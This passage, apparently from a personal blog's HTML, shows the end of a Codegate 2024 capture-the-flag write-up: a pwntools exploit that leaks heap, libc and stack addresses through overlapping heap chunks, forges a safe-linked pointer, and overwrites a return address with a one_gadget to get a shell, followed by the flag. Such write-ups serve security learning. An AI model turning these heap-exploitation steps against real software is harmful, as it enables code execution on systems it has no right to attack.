+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decoded <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_P1</span>(P, L):
+</span></span><span style="display:flex;"><span>    L12 <span style="color:#f92672">=</span> L <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>    P <span style="color:#f92672">=</span> P<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>    L12 <span style="color:#f92672">=</span> L12<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(bytes([p<span style="color:#f92672">^</span>l12 <span style="color:#66d9ef">for</span> p,l12 <span style="color:#f92672">in</span> zip(P,L12)])<span style="color:#f92672">.</span>hex(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size, data):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, str(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modify</span>(idx, data):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> len(data) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(idx):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1. add&#34;</span>)[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">16</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">16</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">16</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>        add(<span style="color:#ae81ff">199</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">199</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    free(<span style="color:#ae81ff">3</span>) <span style="color:#75715e"># chunk for heap leak</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># leak libc and heap abusing chunk overlapping and unsortedbins</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4f1</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">40</span>)
+</span></span><span style="display:flex;"><span>    modify(<span style="color:#ae81ff">1</span>, payload)
+</span></span><span style="display:flex;"><span>    heap <span style="color:#f92672">=</span> u64(view(<span style="color:#ae81ff">2</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:]) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;heap: </span><span style="color:#e6db74">{</span>hex(heap)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    free(<span style="color:#ae81ff">2</span>) <span style="color:#75715e"># free big chunk into unsortedbins</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">40</span>)
+</span></span><span style="display:flex;"><span>    modify(<span style="color:#ae81ff">0</span>, payload)
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(view(<span style="color:#ae81ff">1</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:]) <span style="color:#f92672">-</span> (libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;main_arena&#34;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">96</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc: </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    modify(<span style="color:#ae81ff">0</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># leak stack (environ)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x81</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>    modify(<span style="color:#ae81ff">4</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    free(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;environ&#34;</span>])
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">120</span>, payload)
+</span></span><span style="display:flex;"><span>    retaddr <span style="color:#f92672">=</span> u64(view(<span style="color:#ae81ff">2</span>)[:<span style="color:#ae81ff">8</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x120</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;stack: </span><span style="color:#e6db74">{</span>hex(retaddr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    free(<span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># ROP on the stack</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0x61</span>) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        p64(calculate_P1(retaddr<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>, heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x378</span>)) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        p64(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x388</span>) <span style="color:#f92672">+</span> <span style="color:#75715e"># goes in rbp (tweak for onegadet)</span>
+</span></span><span style="display:flex;"><span>        p64(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x390</span>) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">120</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ONE_GADGET <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xebd3f</span>
+</span></span><span style="display:flex;"><span>    rbp <span style="color:#f92672">=</span> p64(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x380</span>)
+</span></span><span style="display:flex;"><span>    retaddr <span style="color:#f92672">=</span> p64(ONE_GADGET)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">16</span>, rbp <span style="color:#f92672">+</span> retaddr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>) <span style="color:#75715e"># exit to trigger onegadget</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p><strong>FLAG</strong>: codegate2024{f0de50c65021e07779d3cde7576c4fbe519e6412ad7de1ee743abd08b5b435844184c2295ff705f54b55790a454c427b8faf1d65bbf1f4e19df0c5613d36b0}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://leo1.cc:5555/">leo_something</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+    const images = Array.from(document.querySelectorAll(".post-content img"));
+    images.forEach(img => {
+        mediumZoom(img, {
+            margin: 0,  
+            scrollOffset: 40,  
+            container: null,  
+            template: null,  
+            background: 'rgba(0, 0, 0, 0.8)'
+        });
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
